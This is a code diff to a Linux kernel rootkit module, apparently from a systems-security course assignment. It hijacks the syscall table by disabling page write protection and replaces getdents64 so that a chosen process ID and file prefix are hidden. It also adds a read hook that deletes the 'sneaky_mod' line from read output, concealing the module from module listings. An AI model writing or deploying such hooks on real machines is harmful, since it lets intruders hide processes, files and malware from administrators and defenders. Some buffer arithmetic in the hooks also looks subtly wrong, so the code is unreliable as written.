@@ -20,7 +20,6 @@ static unsigned long *sys_call_table;
 // Helper functions, turn on and off the PTE address protection mode
 // for syscall_table pointer
 int enable_page_rw(void *ptr) {
-    // ptr 是一个指向内核地址空间中的内存地址的指针
     unsigned int level;
     pte_t *pte = lookup_address((unsigned long)ptr, &level);
     // if PTE is not writable, set it to writable
@@ -37,12 +36,7 @@ int disable_page_rw(void *ptr) {
     pte->pte = pte->pte & ~_PAGE_RW;
     return 0;
 }
-/*
- * 系统调用表是一个存储内核中各个系统调用函数地址的表。
- * 这个项目的目的是修改系统调用表，以便将原始的 openat、getdents64 和 read 系统
- * 调用替换为新的、具有隐藏功能的版本。
- */
-/* enable_page_rw和disable_page_rw分别在initialize_sneaky_module和exit_sneaky_module函数中被调用 */
+
 
 // 1. Function pointer will be used to save address of the original 'openat' syscall.
 // 2. The asmlinkage keyword is a GCC #define that indicates this function
@@ -78,7 +72,7 @@ module_param(sneaky_pid, charp, 0);
 /**
  * @brief isSneakyProcess is a helper function to check if the process is sneaky_process
 */
-bool isSneakyProcess(struct linux_dirent *dirent, char *sneaky_pid) {
+bool isSneakyProcess(struct linux_dirent64 *dirent, char *sneaky_pid) {
 	if (strcmp(dirent->d_name, sneaky_pid) == 0 || strcmp(dirent->d_name, PREFIX) == 0) {
 		return true;
 	}
@@ -95,7 +89,7 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 	int length = (*original_getdents64)(regs);
 
 	// get the start address of the linux_dirent struct
-	struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
+	struct linux_dirent64 *dirent = (struct linux_dirent64 *)regs->si;
 
 	int offset = 0;
 
@@ -103,10 +97,10 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 		// if the first entry is sneaky_process, then skip it
 		offset += dirent->d_reclen;
 		// delete the sneaky_process from the buffer
-		memmove(dirent, (char *)dirent + offset, length - dirent->d_reclen);
+		memmove((char *)dirent, (char *)dirent + offset, length - dirent->d_reclen);
 	} else {
 		while (offset <= length) {
-			struct linux_dirent *temp = (struct linux_dirent *)((char *)dirent + offset);
+			struct linux_dirent64 *temp = (struct linux_dirent64 *)((char *)dirent + offset);
 			if (isSneakyProcess(temp, sneaky_pid)) {
 				// if the entry is sneaky_process, then skip it
 				//offset += temp->d_reclen;
@@ -124,9 +118,23 @@ asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
 
 asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
 
+char * findPos(char* start, const char * target, ssize_t length) {
+    char * pos = strnstr(start, target, length);
+    return pos;
+}
 
 asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
-	
+    ssize_t length = (*original_read)(regs);
+    void * begin = (void *)regs->si;
+    char * first = findPos((char *)begin, "sneaky_mod", length);
+    if (first != NULL) {
+        char * second = findPos(first, "\n", length - (first - (char *)begin));
+        if (second != NULL) {
+            memmove(first, second + 1, length - (second - (char *)begin) - 1);
+            length = length - (ssize_t)(second - first) - 1;
+        }
+    }
+    return length;
 }
 
 
@@ -144,11 +152,15 @@ static int initialize_sneaky_module(void) {
     // function address. Then overwrite its address in the system call
     // table with the function address of our new code.
     original_openat = (void *)sys_call_table[__NR_openat];
+    original_getdents64 = (void *)sys_call_table[__NR_getdents64];
+    original_read = (void *)sys_call_table[__NR_read];
 
     // Turn off write protection mode for sys_call_table
     enable_page_rw((void *)sys_call_table);
 
     sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+    sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
+    sys_call_table[__NR_read] = (unsigned long)sneaky_read;
 
     // You need to replace other system calls you need to hack here
 
@@ -167,6 +179,8 @@ static void exit_sneaky_module(void) {
     // This is more magic! Restore the original 'open' system call
     // function address. Will look like malicious code was never there!
     sys_call_table[__NR_openat] = (unsigned long)original_openat;
+    sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+    sys_call_table[__NR_read] = (unsigned long)original_read;
 
     // Turn write protection mode back on for sys_call_table
     disable_page_rw((void *)sys_call_table);
